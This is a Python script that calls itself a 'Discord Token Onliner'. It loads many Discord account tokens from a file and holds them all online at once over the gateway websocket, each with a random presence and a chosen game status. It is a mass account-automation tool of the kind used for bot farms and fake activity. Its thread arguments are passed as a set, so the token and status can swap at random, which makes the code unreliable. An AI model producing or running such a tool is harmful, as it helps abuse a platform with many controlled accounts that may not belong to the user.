import time
import sys
import json
import time, base64
import random
from builtins import *

def print015(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)
    sys.stdout.write("\n")

def print01(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)


try:
    import os
    os.system("title " + "Discord Token Onliner, by Wznj")
except:
    pass

import os
try:
    import colorama, websocket
except:
    sys.stdout.write("> ")
    print015("Missing Required Modules, Press Enter To Download (May Not Always Work)")
    input("")
    try:
        import os
        os.system("pip install colorama websocket")
    except:
        pass
    sys.stdout.write("> ")
    print015("Problem Fixed Now, Restart The Tool")
    input("")
    exit()
colorama.init(autoreset=True)


lest = []


def onliner(token, status):
    global lest
    try:
        n1 = random.choice(["online", "dnd", "idle"])
        n2 = random.choice([1,2,3,4])
        payload = {
                "op": 2,
                "d": {
                    "token": token,
                    "properties": {
                        "$os": sys.platform,
                        "$browser": "RTB",
                        "$device": f"{sys.platform} Device"
                    },
                    "presence": {
                        "game": {
                            "name": status,
                            "type": int(n2)},
                        "status": n1,
                        "since": 0,
                        "afk": False
                    }
                },
                "s": None,
                "t": None
        }



        ws = websocket.WebSocket()
        ws.connect("wss://gateway.discord.gg/?v=6&encoding=json")
        ur = json.loads(ws.recv())
        use = ur["d"]["heartbeat_interval"]
        ws.send(json.dumps(payload))
        first = True
        oy = {
                "op": 1,
                "d": None
        }
        while True:
            try:
                ws.send(json.dumps(oy))
                if first == True:
                    lest.append("Onlined Token")
                    first = False
            except Exception as e:
                lest.append("Unknown Error")
            time.sleep(use / 1000)
    except:
        lest.append("Unknown Error")



sys.stdout.write(colorama.Fore.CYAN + "> ")
print01("Press Enter To Load Tokens: ")
print("")
input("")
tokens = []
den = 0
try:
    with open("tokens.txt", "r") as file:
        tokenss = file.readlines()
    for token in tokenss:
        if "\n" in token:
            token = token[:-1]
        tokens.append(token)
        den = int(den) + 1
        print(f"{colorama.Fore.CYAN}[{colorama.Fore.RESET}{str(den)}{colorama.Fore.CYAN}]{colorama.Fore.RESET} Loaded Token")
except:
    sys.stdout.write(colorama.Fore.RED + "> ")
    print01("Missing tokens.txt")
    input("")
    exit()

print("")

sys.stdout.write(colorama.Fore.CYAN + "> ")
print01("Enter Status Of Tokens: ")
status = input("")


sys.stdout.write(colorama.Fore.CYAN + "> ")
print01("Press Enter To Start Mass Status Changer")
input("")
import threading
def er():
    for u in tokens:
        threading.Thread(target=onliner, args={u, status}).start()
threading.Thread(target=er).start()
done = 0
while True:
    for u in lest:
        lest.remove(u)
        if "Onlined" in u:
            done = int(done) + 1
            sys.stdout.write(colorama.Fore.CYAN + "[")
            sys.stdout.write(str(done))
            sys.stdout.write(colorama.Fore.CYAN + "]")
            print(" " + u)
        if "Unknown" in u:
            sys.stdout.write(colorama.Fore.RED + "> ")
            print(u)
